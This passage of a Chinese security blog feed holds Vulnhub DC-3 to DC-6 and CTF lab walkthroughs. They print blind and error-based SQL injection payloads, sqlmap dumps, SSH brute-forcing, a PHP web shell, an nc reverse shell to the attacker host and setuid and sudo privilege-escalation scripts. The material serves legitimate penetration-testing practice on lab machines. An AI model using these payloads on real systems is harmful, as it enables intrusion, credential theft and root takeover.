1,1),4)=&apos;flag&apos;,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p>sqlmap 跑出剩余的<br>命令：<code>sqlmap -u url -D pentesterlab --tables</code><br><img src="https://img-blog.csdnimg.cn/20190611001557667.png" alt="在这里插入图片描述">## 4 获取字段值</p><ul><li>猜解长度<br>  猜解第二个字段值的长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(length((select column_name from information_schema.columns where table_name=&apos;flag&apos; limit 1,1))=4,sleep(5),1)—</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/20190611001730951.png" alt="在这里插入图片描述"></p><ul><li>猜解字段值<br>  第一个字段值的第3位 为i<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),1,1))=105,sleep(4),1) --</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/20190611001842476.png" alt="在这里插入图片描述">    第一个字段值的第2位 为d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/ip/flag.php?type=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1),2,1))&gt;99,sleep(4),1) --</span><br></pre></td></tr></table></figure><p>所以第一个字段值为id</p><ul><li>left<br>  利用left求第二个字段值<br>  第一个字符为f，直接猜测flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(left((select column_name from information_schema.columns where table_name=0x666c6167 limit 1,1),1)=&apos;f&apos;,sleep(4),1) --</span><br><span class="line">成功延时</span><br><span class="line">http://219.153.49.228:40472/flag.php?type=1 and if(left((select column_name from information_schema.columns where table_name=0x666c6167 limit 1,1),4)=&apos;flag&apos;,sleep(4),1)—</span><br></pre></td></tr></table></figure></li></ul><h2 id="5-下载数据"><a href="#5-下载数据" class="headerlink" title="5 下载数据"></a>5 下载数据</h2><ul><li><p>猜长度<br>  猜测第一个数据的长度为6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(length((select flag from flag limit 0,1))=6,sleep(4),1)--</span><br></pre></td></tr></table></figure></li><li><p>猜数据<br>  第一位数据为m</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(ascii(substr((select flag from flag limit 0,1),1))=109,sleep(4),1)--</span><br></pre></td></tr></table></figure><p>  直接猜测mozhe发现缺少一位，猜测最后一位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(ascii(substr((select flag from flag limit 0,1),6))=49,sleep(4),1)--</span><br></pre></td></tr></table></figure></li></ul><p>最后一位是1</p><p>使用left验证<br>    成功延时，拿到flag去验证把</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/flag.php?type=1 and if(left((select flag from flag limit 0,1),6)=&apos;mozhe1&apos;,sleep(4),1)--</span><br></pre></td></tr></table></figure><p> 使用sqlmap验证<br> 命令：<code>sqlmap -u url -D pentesterlab -T flag -C flag --dump</code><br> <img src="https://img-blog.csdnimg.cn/20190611002407450.png" alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> 时间盲注特别耗时间，在做的过程中要仔细，还要注意每个函数的括号，避免由于少个括号一直错误。</p><hr><p>永远不要停下学习的脚步</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;了解盲注语法，如何利用盲注获取数据&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="sql盲注" scheme="http://yoursite.com/tags/sql%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub 之 DC-6 靶机复现</title>
    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-6/"/>
    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-6/</id>
    <published>2019-10-04T03:03:41.000Z</published>
    <updated>2019-10-04T03:16:16.813Z</updated>
    
    <content type="html"><![CDATA[<p>掌握nmap，sudo 提权方式</p><a id="more"></a><p>[TOC]</p><h1 id="Vulnhub-之-DC-6-靶机复现"><a href="#Vulnhub-之-DC-6-靶机复现" class="headerlink" title="Vulnhub 之 DC-6 靶机复现"></a>Vulnhub 之 DC-6 靶机复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>本靶机仅供学习使用，请不要用于其他路径，作者不承担任何法律责任</strong></p><p>终于打到dc的最后一个靶机了，花了几个月的闲暇时间来试试，越到后面靶机的难度就会越来越大。所以也参考了一个资料 ，善于使用搜索引擎对您的学习很有进步。</p><h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>按例做一个描述，获取一些关于靶机的提示，这对你如何去拿下它有很大的帮助</p><p>下载地址：<a href="http://www.five86.com/dc-4.html" target="_blank" rel="noopener">DC-6</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取有用的信息，这可能是爆破的密码</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali: 192.168.248.130</span><br><span class="line">DC-6: 192.168.248.145</span><br></pre></td></tr></table></figure><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul><li><p>获取ip和端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 网段</span><br><span class="line">nmap -sS ip</span><br></pre></td></tr></table></figure><p>开启了22和80端口</p></li></ul><ul><li><p>这里访问会跳转到wordy，但是访问失败需要手动绑定。之前的环境也出现过相同的问题</p><p>打开发现是wordpress的cms ，使用wpscan扫描用户，这个在之前的DC-2也同样使用过</p><p>安装参考：<a href="https://www.freebuf.com/sectool/174663.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/174663.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查找网站上所有的用户</span><br><span class="line">wpscan --url http://wordy/ -e</span><br><span class="line">这边使用的kali 可能会出现无法更新的情况，在请问大佬后给出了 apt-get upgrate 通过更新源去更新wpscan，这样也能达到同样的效果</span><br></pre></td></tr></table></figure></li></ul><p>  成功获取到了5个用户</p><p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805093436.png" alt></p><ul><li><p>爆破</p><p>接下来就是爆破密码了，根据我们获得的提示，生成字典</p><p><code>cat rockyou.txt | grep k01 &gt; passwords.txt</code></p><p>之后使用wpscan 去爆破 获取到一个用户名和密码：mark/helpdesk01s</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805102249.png" alt></p><p>后台地址：</p><p><a href="http://wordy/wp-login.php" target="_blank" rel="noopener">http://wordy/wp-login.php</a></p></li><li><p>全局查看 </p><p>没有发现有用的信息，查看插件发现存在 Activity monitor，搜索 发现存在远程命令执行的漏洞</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805103952.png" alt></p></li><li><p>接下来就是使用它去</p><p><a href="https://www.exploit-db.com/exploits/45274" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45274</a> 这里给出一个脚本的链接</p><p>我们需要修改他里面的nc  就可以反弹shell</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805104847.png" alt></p><p>​    或者使用burp</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805110533.png" alt></p><p>都可以反弹到shell</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805110758.png" alt></p></li><li><p>提权</p><p>在mark目录下发现stuff 得到用户，切换用户</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805111207.png" alt></p><p>发现sudo权限</p><p>尝试利用提权，这里可以修改拿到jens的权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805111859.png" alt></p><p>继续深入 发现用户存在nmap的权限</p><p>搜索 发现nmap提权方式 </p><p>通过root权限执行nmap 然后nmap 去执行脚本， 获取root权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805112828.png" alt></p><p>之后就是root 权限了， 接下来就是 看看flag</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190806094954.png" alt></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;掌握nmap，sudo 提权方式&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>DC-5 复现</title>
    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-5%20/"/>
    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-5 /</id>
    <published>2019-10-04T03:02:39.000Z</published>
    <updated>2019-10-04T03:03:28.663Z</updated>
    
    <content type="html"><![CDATA[<p>掌握利用各种root权限的环境提权</p><a id="more"></a><h1 id="Vulnhub-之-DC-5-靶机复现"><a href="#Vulnhub-之-DC-5-靶机复现" class="headerlink" title="Vulnhub 之 DC-5 靶机复现"></a>Vulnhub 之 DC-5 靶机复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本靶机只做学习使用，不要将其利用于非法途径。</p><p>终于来到了倒数第二关，这一关将难度增加，所以我们需要借助搜索工具来帮助我们完成</p><h2 id="作者描述"><a href="#作者描述" class="headerlink" title="作者描述"></a>作者描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DC-5是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">这个计划是为了让DC-5更上一层楼，所以这对初学者来说可能不太好，但对有中级或更好经验的人来说应该没问题。时间会证明一切(反馈也会证明)。</span><br><span class="line"></span><br><span class="line">据我所知，只有一个可利用的入口点可以进入(也没有SSH)。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些有点不寻常的东西(随着页面刷新而改变的东西)。这将有希望提供一些关于漏洞可能涉及到什么的想法。</span><br><span class="line"></span><br><span class="line">请注意，这里不涉及phpmailer漏洞。:-)</span><br><span class="line"></span><br><span class="line">这一挑战的最终目标是找到根，阅读唯一的旗帜。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br></pre></td></tr></table></figure><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>kali： 192.168.248.130</p><p>DC-5 : 192.168.248.142</p><h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><ul><li>还是老套路扫网段，扫端口。拿到ip：192.168.248.142 开了两个端口：80和111</li></ul><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723183828.png" alt></p><ul><li><p>目录遍历</p><p>访问这些网站，试图寻找新的东西</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723195951.png" alt></p></li><li><p>查看网站</p><p>在concat.php 发现了输入栏</p><p>看到输入框就测测sql注入，xss</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723185409.png" alt></p><p>发现在url处返回了<a href="http://192.168.248.142/thankyou.php?firstname=1&amp;lastname=1&amp;country=other&amp;subject=1" target="_blank" rel="noopener">http://192.168.248.142/thankyou.php?firstname=1&amp;lastname=1&amp;country=other&amp;subject=1</a></p></li><li><p>文件包含</p><p>发现<code>foster 包含的copyright 20xx</code> 是会变化的</p><p>php在底部调用了footer.php 可能存在本地文件包含，尝试file=xxx测试</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723201552.png" alt></p></li></ul><ul><li><p>利用文件包含获取shell</p><p>由于网站会记录url日志，写一句话进去，访问获取shell</p><p><code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723205437.png" alt></p><p>访问日志，并执行nc命令，获取到shell</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723205339.png" alt></p></li><li><p>借用提权工具</p><p>LinEnum.sh 获取到了提权操作</p><p>发现 guid 处存在可以文件</p><p>搜索发现提权思路</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723212545.png" alt></p><p>参考：<a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41154</a></p><p>先编译后上传执行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>通过wget上传</p><p>之后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723214526.png" alt></p></li></ul><h2 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h2><p>在root目录下</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723223011.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;掌握利用各种root权限的环境提权&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="suid提权" scheme="http://yoursite.com/tags/suid%E6%8F%90%E6%9D%83/"/>
    
      <category term="本地文件包含" scheme="http://yoursite.com/tags/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub DC-4</title>
    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-4/"/>
    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-4/</id>
    <published>2019-10-04T03:02:24.000Z</published>
    <updated>2019-10-04T03:02:25.769Z</updated>
    
    <content type="html"><![CDATA[<p>熟悉提权步骤，和漏洞发现</p><a id="more"></a><h1 id="Vulnhub-之-DC-4"><a href="#Vulnhub-之-DC-4" class="headerlink" title="Vulnhub 之 DC-4"></a>Vulnhub 之 DC-4</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DC已经做了一半了，前三次都是基于初学者的，这次的难度就提升了，适合初学者和入</p><p>门的伙伴。</p><p>还是按照常例看看作者是怎么描述的吧。</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DC-4是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与以前的DC版本不同，这个版本主要是为初学者/中间用户设计的。只有一面旗帜，但技术上来说，有多个入口，就像上次一样，没有线索。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可能会有很大的帮助，但是你可以随时在@DCAU7发推给我寻求帮助，让你重新开始。但是请注意:我不会给你答案，相反，我会给你一个如何前进的想法。</span><br></pre></td></tr></table></figure><p>所以说，谷歌真的很万能。O(∩<em>∩)O哈哈~</em></p><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>记得修改DC-4的网络为NAT模式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali : 192.168.248.130</span><br><span class="line"></span><br><span class="line">DC-4 : 192.168.248.128</span><br></pre></td></tr></table></figure><h2 id="靶机复现"><a href="#靶机复现" class="headerlink" title="靶机复现"></a>靶机复现</h2><ul><li><p>扫描网段</p><p><code>nmap -sn 192.168.248.0/24</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721142149.png" alt></p><p>发现目标ip ： 192.168.248.128</p></li><li><p>扫描端口</p><p><code>nmap -sS 192.168.248.128</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721143438.png" alt></p></li><li><p>尝试爆破ssh</p><p><code>hydra  -l root -P /root/Desktop/weakpass.txt -t 5 ssh://192.168.248.128</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721144835.png" alt></p><p>一般破解需要时间所以我就做一个演示</p></li><li><p>网站搜寻线索</p><p>发现是一个登录框，</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721145420.png" alt></p><p>并且没有登录限制，尝试爆破</p><p>可以使用hydra爆破，这里我使用burp做测试</p><p>设置为<code>Cluster bomb</code>,用户给admin和root ，密码采用弱口令字典这个网上挺多的，或者使用hydra的默认字典也可以，然后线程跑高点 ， 我这里给burp设置的20，大概不到一分钟就出来了。</p></li></ul><p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721151611.png" alt></p><p>  这里只要登录成功后之后的登录都是636了</p><ul><li><p>登录发现</p><p>有三个命令可以运行，然后抓包查看发现可以在radio这块执行了系统命令，那么是否可以执行其他的命令</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721161839.png" alt></p><p>尝试执行<code>whoami</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162107.png" alt></p><p>既然可以执行一些简单的命令，我们就可以尝试去反弹shell</p><p>命令：<code>nc -e /bin/sh 192.168.248.130 4444</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721162638.png" alt></p><p>获取交互模式</p><p>命令：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>之后在home的jim目录下发现了一个旧密码的备份</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721163345.png" alt></p><p>或许可以尝试用它去爆破ssh</p><p>命令：<code>chydra  -L /root/Desktop/user.txt -P /root/Desktop/dc_pass.txt -t 5 ssh://192.168.248.128</code></p><p>等待是漫长的，要有耐心</p><p>终于出来了一个  用户名：<code>jim</code> 密码：<code>jibril04</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721172645.png" alt></p><p>切换到jim用户下，打开mbox查看</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165049.png" alt></p><p>有邮件，去mail下查看，发现了jim文件获取到jim的密码</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721165234.png" alt></p></li><li><p>登录charles</p><p>密码： <code>^xHhA&amp;hvim0y</code></p><p>命令：<code>sudo -l</code>查看权限 发现可以不需要密码执行teehee</p><p>百度得到提权方式</p><p>1 通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171456.png" alt></p><p>2 还有个2呢，多个想法多个活路</p><p>通过添加用户到passwd，设置其权限，之后su 访问即可获得root</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/21/20190721171755.png" alt></p><p>所以，最好不要给用户sudo权限，或者限制sudo权限的，这样才能保证网络安全</p></li></ul><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>今天的靶机奉上各位看官，过程简单，主要掌握提权的思路和前期爆破的等待。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;熟悉提权步骤，和漏洞发现&lt;/p&gt;
    
    </summary>
    
    
      <category term="靶机" scheme="http://yoursite.com/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="远程命令执行" scheme="http://yoursite.com/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub之DC-3 joomla注入和ubutnu16.04 提权</title>
    <link href="http://yoursite.com/2019/10/04/%E9%9D%B6%E6%9C%BA/Vulnhub%20DC-3/"/>
    <id>http://yoursite.com/2019/10/04/靶机/Vulnhub DC-3/</id>
    <published>2019-10-04T03:00:11.000Z</published>
    <updated>2019-10-04T03:00:54.489Z</updated>
    
    <content type="html"><![CDATA[<p>常见cms漏洞 和系统版本提权</p><a id="more"></a><h1 id="Vulnhub靶机之DC-3"><a href="#Vulnhub靶机之DC-3" class="headerlink" title="Vulnhub靶机之DC-3"></a>Vulnhub靶机之DC-3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p> 刚考完试，然而不能放弃对技术的热爱，又重新拾起了dc准备把他们6个做完  </p><p> 今天介绍的是dc-3 ，来看看作者对他的评价</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line"></span><br><span class="line">DC-3是另一个专门建造的脆弱实验室，旨在获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">与之前的DC版本一样，这个版本在设计时考虑了初学者，虽然这一次，只有一个标志，一个入口点，根本没有线索。</span><br><span class="line">Linux技能和熟悉Linux命令行是必须的，基本渗透测试工具的一些经验也是必须的。</span><br><span class="line"></span><br><span class="line">对于初学者来说，谷歌可以提供很大的帮助，但是你总是可以在@ DCAU7上给我发信息以获得帮助，让你再次前行。 但请注意：我不会给你答案，相反，我会告诉你如何前进。</span><br><span class="line"></span><br><span class="line">对于那些有CTF和Boot2Root挑战经验的人来说，这可能不会花费你很长时间（实际上，你可能很容易花费不到20分钟）。</span><br><span class="line"></span><br><span class="line">如果是这种情况，并且如果您希望它更具挑战性，您可以随时重做挑战并探索获得根并获得旗帜的其他方式</span><br></pre></td></tr></table></figure><h2 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h2><p>首先设置靶机为NAT模式,如果获取不到ip 删除网络适配器重新添加</p><p>ip地址：</p><blockquote><p>kali： 192.168.31.225</p><p>DC-3： 192.168.31.19</p></blockquote><h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><p>由于下载的靶机是vbox的使用的，在vmware上出现了一些小问题，所以耽搁了一点时间。</p><p>解决方法： vmware打开kali并且vbox打开DC-3 或者都使用vbox去打开</p><ul><li><p>扫描网段</p><p>命令：<code>nmap -sn 192.168.31.0/24</code></p></li></ul><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161450.png" alt></p><ul><li><p>扫描端口</p><p>命令： <code>nmap -sS 192.168.31.19</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161610.png" alt></p></li><li><p>访问网站</p><p>url: <a href="http://192.168.31.19" target="_blank" rel="noopener">http://192.168.31.19</a></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161821.png" alt></p></li><li><p>指纹获取</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720161925.png" alt></p></li><li><p>看起来是joomla的cms，使用扫描工具跑一下</p><p>这里使用kali自带的扫描工具</p><p>命令： <code>joomscan -u http://192.168.31.19</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162351.png" alt></p><p>看来没有什么结果，在搜索的同时 ，我们尝试一些简单的操作，比如弱密码，sql注入，但是看起来情况不容乐观啥都没有，</p><p>扫描结果出来了，看看扫描到了版本信息，后台</p><p>版本信息： <code>Joomla 3.7.0</code></p><p>后台目录： <code>http://192.168.31.19/administrator/</code></p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720162744.png" alt></p></li><li><p>查找相关漏洞</p><p>发现这个版本存在sql注入漏洞</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720163337.png" alt></p><p>接下来就是复现一下了</p></li><li><p>通过搜索发现可以注入获取到hash密码</p><p>参考链接： <a href="https://www.anquanke.com/post/id/86119" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86119</a></p><p>这里先借用工具试试： <a href="https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py</a></p><p>复制到本地，然后执行命令:<code>python joomblah.py http://192.168.31.19</code></p><p>获取到user的信息</p><p><code>Found user [&#39;629&#39;, &#39;admin&#39;, &#39;admin&#39;, &#39;freddy@norealaddress.net&#39;,&#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39;, &#39;&#39;, &#39;&#39;]</code></p></li></ul><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720165327.png" alt></p><p>​    手工注入</p><p>​    获取hash 或者可以获取session来登录</p><p>​    附上poc 参考链接: <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/42033</a></p><p>​    using sqlmap</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure><p>1获取当前的用户</p><p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)</p><p>​    也可以获取最近登录的session 这样也可以登录后台</p><p>​    2 获取版本</p><p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(version())),0)</p><p>​    <code>XPATH syntax error: &#39;&gt;5.7.25-0ubuntu0.16.04.2</code></p><p>​    3 查数据库</p><p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,(database())),0)</p><p>​    <code>XPATH syntax error: &#39;&gt;joomladb&#39;</code></p><p>​    参考链接</p><p>​    <a href="https://www.jianshu.com/p/76451380b129" target="_blank" rel="noopener">https://www.jianshu.com/p/76451380b129</a></p><p>​    4 获取表</p><p>​    index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3a,    (SELECT(concat(0x3e,TABLE_NAME))FROM(information_schema.tables) where table_schema like         database() LIMIT 1,1),0x3a),1)</p><p>​    但是获取的没有前缀</p><p>​    我们通过16进制去获取到完整的表名，然后在通过转换获取到他的字符串</p><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720202649.png" alt></p><p>​    5 获取列名<br>​    UpdateXML(2,concat(0x3a,(SELECT(concat(COLUMN_NAME))FROM(information_schema.COLUMNS) WHERE TABLE_NAME LIKE 0x6c6d6278635f636f6e74656e7474 LIMIT 